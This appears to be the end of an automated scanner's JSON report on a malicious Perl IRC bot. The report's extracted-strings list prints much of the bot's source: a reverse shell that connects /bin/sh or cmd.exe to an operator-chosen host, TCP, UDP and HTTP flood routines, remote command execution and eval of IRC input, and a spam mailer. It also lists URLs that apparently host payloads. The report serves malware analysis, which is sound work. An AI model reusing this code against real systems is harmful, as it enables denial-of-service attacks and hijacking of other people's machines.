            "print SENDMAIL \"Subject: $subject\\n\"; ",
            "print SENDMAIL \"From: $sender\\n\";",
            "print SENDMAIL \"To: $recipient\\n\\n\";",
            "print SENDMAIL \"@corpo\\n\\n\";",
            "close (SENDMAIL);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Mailer",
            "12.:!:.",
            " Successfully Sended to :",
            "10 $recipient\"); ",
            "######################",
            "#   End of MAILER    #  ",
            "######################",
            "######################",
            "#  Join And Part     # ",
            "######################",
            "           if ($funcarg =~ /^join (.*)/) {",
            "              sendraw($IRC_cur_socket, \"JOIN \".$1);",
            "           }",
            "           if ($funcarg =~ /^part (.*)/) {",
            "              sendraw($IRC_cur_socket, \"PART \".$1);",
            "           }",
            "\t   if($funcarg=~ /^\\:$admin!.*\\@.*PRIVMSG.*:!out/){",
            "\t      sendraw($IRC_cur_socket, \"QUIT\");",
            "\t   }",
            "\t\t   ",
            "######################",
            "#End of Join And Part# ",
            "######################",
            "######################",
            "#     TCPFlood       # ",
            "######################",
            "if ($funcarg =~ /^tcpflood\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "TCP DDoS",
            "12.:!:.",
            " Haaajjjaaarrr",
            "4 \".$1.\":\".$2.\" ",
            "for ",
            "12 \".$3.\" ",
            "seconds.",
            "  my $itime = time;",
            "  my ($cur_time);",
            "  $cur_time = time - $itime;",
            "  while ($3>$cur_time){",
            "  $cur_time = time - $itime;",
            "  &tcpflooder(\"$1\",\"$2\",\"$3\");",
            "sendraw($IRC_cur_socket,\"PRIVMSG $printl :",
            "12.:!:.",
            "TCP DDoS",
            "12.:!:.",
            " Missi Selesai..",
            "12 \".$1.\":\".$2.\".\");",
            "######################",
            "#  End of TCPFlood   # ",
            "######################",
            "######################",
            "#   Back Connect     # ",
            "######################",
            "if ($funcarg =~ /^back\\s+(.*)\\s+(\\d+)/) {",
            "my $host = \"$1\";",
            "my $porta = \"$2\";",
            "my $proto = getprotobyname('tcp');",
            "my $iaddr = inet_aton($host);",
            "my $paddr = sockaddr_in($porta, $iaddr);",
            "my $shell = \"/bin/sh -i\";",
            "if ($^O eq \"MSWin32\") {",
            "  $shell = \"cmd.exe\";",
            "socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die \"socket: $!\";",
            "connect(SOCKET, $paddr) or die \"connect: $!\";",
            "open(STDIN, \">&SOCKET\");",
            "open(STDOUT, \">&SOCKET\");",
            "open(STDERR, \">&SOCKET\");",
            "system(\"$shell\");",
            "close(STDIN);",
            "close(STDOUT);",
            "close(STDERR);",
            "if ($estatisticas)",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "BackConnect",
            "12.:!:.",
            " Connecting to ",
            "4 $host:$porta\");",
            "######################",
            "#End of  Back Connect#",
            "######################",
            "######################",
            "#     HTTPFlood      # ",
            "#                    #",
            "######################",
            "if ($funcarg =~ /^httpflood\\s+(.*)\\s+(\\d+)/) {",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "7.:!:.",
            "Http DDoS",
            "7.:!:.",
            " Haaajjjaaarrr",
            "12 \".$1.\" ",
            "on port 80 untuk ",
            "4 \".$2.\" ",
            "Detik ",
            ".\");",
            "my $itime = time;",
            "my ($cur_time);",
            "$cur_time = time - $itime;",
            "while ($2>$cur_time){",
            "$cur_time = time - $itime;",
            "my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);",
            "print $socket \"GET / HTTP/1.1\\r\\nAccept: */*\\r\\nHost: \".$1.\"\\r\\nConnection: Keep-Alive\\r\\n\\r\\n\";",
            "close($socket);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Http DDoS",
            "12:!:.",
            " Selesai menghajar",
            "4 \".$1.\".\");",
            "######################",
            "#  End of HTTPFlood  # ",
            "#                    #",
            "######################",
            "######################",
            "#     UDPFlood       # ",
            "#                    #",
            "######################",
            "if ($funcarg =~ /^udpflood\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Udp DDoS",
            "12.:!:.",
            " Haaajjjaaarrr",
            "12 \".$1.\" ",
            "dengan ",
            "4 \".$2.\" ",
            "Kb Packets untuk ",
            "4 \".$3.\" ",
            "detik.",
            "my ($dtime, %pacotes) = udpflooder(\"$1\", \"$2\", \"$3\");",
            "$dtime = 1 if $dtime == 0;",
            "my %bytes;",
            "$bytes{igmp} = $2 * $pacotes{igmp};",
            "$bytes{icmp} = $2 * $pacotes{icmp};",
            "$bytes{o} = $2 * $pacotes{o};",
            "$bytes{udp} = $2 * $pacotes{udp};",
            "$bytes{tcp} = $2 * $pacotes{tcp};",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:!:.",
            "Udp DDoS",
            "12.:!:.",
            " Results",
            "4 \".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024).\" ",
            "Kb in",
            "12 \".$dtime.\" ",
            "seconds to",
            "12 \".$1.\".\");",
            "exit;",
            "######################",
            "#  End of Udpflood   # ",
            "#                    #",
            "######################",
            "sub ircase {",
            "my ($kem, $printl, $case) = @_;",
            "  if ($case =~ /^join (.*)/) {",
            "     j(\"$1\");",
            "   }",
            "   if ($case =~ /^part (.*)/) {",
            "      p(\"$1\");",
            "   }",
            "if ($case =~ /^rejoin\\s+(.*)/) {",
            "my $chan = $1;",
            "if ($chan =~ /^(\\d+) (.*)/) {",
            "for (my $ca = 1; $ca <= $1; $ca++ ) {",
            "p(\"$2\");",
            "j(\"$2\");",
            "else {",
            "p(\"$chan\");",
            "j(\"$chan\");",
            "if ($case =~ /^op/) {",
            "op(\"$printl\", \"$kem\") if $case eq \"op\";",
            "my $oarg = substr($case, 3);",
            "op(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);",
            "if ($case =~ /^deop/) {",
            "deop(\"$printl\", \"$kem\") if $case eq \"deop\";",
            "my $oarg = substr($case, 5);",
            "deop(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);",
            "if ($case =~ /^msg\\s+(\\S+) (.*)/) {",
            "msg(\"$1\", \"$2\");",
            "if ($case =~ /^flood\\s+(\\d+)\\s+(\\S+) (.*)/) {",
            "for (my $cf = 1; $cf <= $1; $cf++) {",
            "msg(\"$2\", \"$3\");",
            "if ($case =~ /^ctcp\\s+(\\S+) (.*)/) {",
            "ctcp(\"$1\", \"$2\");",
            "if ($case =~ /^ctcpflood\\s+(\\d+)\\s+(\\S+) (.*)/) {",
            "for (my $cf = 1; $cf <= $1; $cf++) {",
            "ctcp(\"$2\", \"$3\");",
            "if ($case =~ /^nick (.*)/) {",
            "nick(\"$1\");",
            "if ($case =~ /^connect\\s+(\\S+)\\s+(\\S+)/) {",
            "conectar(\"$2\", \"$1\", 6667);",
            "if ($case =~ /^raw (.*)/) {",
            "sendraw(\"$1\");",
            "if ($case =~ /^eval (.*)/) {",
            "eval \"$1\";",
            "sub shell {",
            "my $printl=$_[0];",
            "my $comando=$_[1];",
            "if ($comando =~ /cd (.*)/) {",
            "chdir(\"$1\") || msg(\"$printl\", \"No such file or directory\");",
            "return;",
            "elsif ($pid = fork) {",
            "waitpid($pid, 0);",
            "else {",
            "if (fork) {",
            "exit;",
            "} else {",
            "my @resp=`$comando 2>&1 3>&1`;",
            "my $c=0;",
            "foreach my $linha (@resp) {",
            "  $c++;",
            "  chop $linha;",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :$linha\");",
            "  if ($c == \"$linas_max\") {",
            "    $c=0;",
            "    sleep $sleep;",
            "exit;",
            "sub tcpflooder {",
            "my $itime = time;",
            "my ($cur_time);",
            "my ($ia,$pa,$proto,$j,$l,$t);",
            "$ia=inet_aton($_[0]);",
            "$pa=sockaddr_in($_[1],$ia);",
            "$ftime=$_[2];",
            "$proto=getprotobyname('tcp');",
            "$j=0;$l=0;",
            "$cur_time = time - $itime;",
            "while ($l<1000){",
            "$cur_time = time - $itime;",
            "last if $cur_time >= $ftime;",
            "$t=\"SOCK$l\";",
            "socket($t,PF_INET,SOCK_STREAM,$proto);",
            "connect($t,$pa)||$j--;",
            "$j++;$l++;",
            "$l=0;",
            "while ($l<1000){",
            "$cur_time = time - $itime;",
            "last if $cur_time >= $ftime;",
            "$t=\"SOCK$l\";",
            "shutdown($t,2);",
            "$l++;",
            "sub udpflooder {",
            "my $iaddr = inet_aton($_[0]);",
            "my $msg = 'A' x $_[1];",
            "my $ftime = $_[2];",
            "my $cp = 0;",
            "my (%pacotes);",
            "$pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;",
            "socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;",
            "socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;",
            "socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;",
            "socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;",
            "return(undef) if $cp == 4;",
            "my $itime = time;",
            "my ($cur_time);",
            "while ( 1 ) {",
            "for (my $porta = 1;",
            "$porta <= 65000; $porta++) {",
            "$cur_time = time - $itime;",
            "last if $cur_time >= $ftime;",
            "send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;",
            "send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;",
            "send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;",
            "send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;",
            "for (my $pc = 3;",
            "$pc <= 255;$pc++) {",
            "next if $pc == 6;",
            "$cur_time = time - $itime;",
            "last if $cur_time >= $ftime;",
            "socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;",
            "send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;",
            "last if $cur_time >= $ftime;",
            "return($cur_time, %pacotes);",
            "sub ctcp {",
            "return unless $#_ == 1;",
            "sendraw(\"PRIVMSG $_[0] :\\001$_[1]\\001\");",
            "sub msg {",
            "return unless $#_ == 1;",
            "sendraw(\"PRIVMSG $_[0] :$_[1]\");",
            "sub notice {",
            "return unless $#_ == 1;",
            "sendraw(\"NOTICE $_[0] :$_[1]\");",
            "sub op {",
            "return unless $#_ == 1;",
            "sendraw(\"MODE $_[0] +o $_[1]\");",
            "sub deop {",
            "return unless $#_ == 1;",
            "sendraw(\"MODE $_[0] -o $_[1]\");",
            "sub j {",
            "&join(@_);",
            "sub join {",
            "return unless $#_ == 0;",
            "sendraw(\"JOIN $_[0]\");",
            "sub p { part(@_);",
            "sub part {",
            "sendraw(\"PART $_[0]\");",
            "sub nick {",
            "return unless $#_ == 0;",
            "sendraw(\"NICK $_[0]\");",
            "sub quit {",
            "sendraw(\"QUIT $_[0]\");"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://munbaekcho.es.kr/gallery/data/log/logger.txt?",
            "http://www.traviswolff.com/gspreadz.txt?",
            "http://"
        ]
    },
    "time": "0:00:00.697057",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
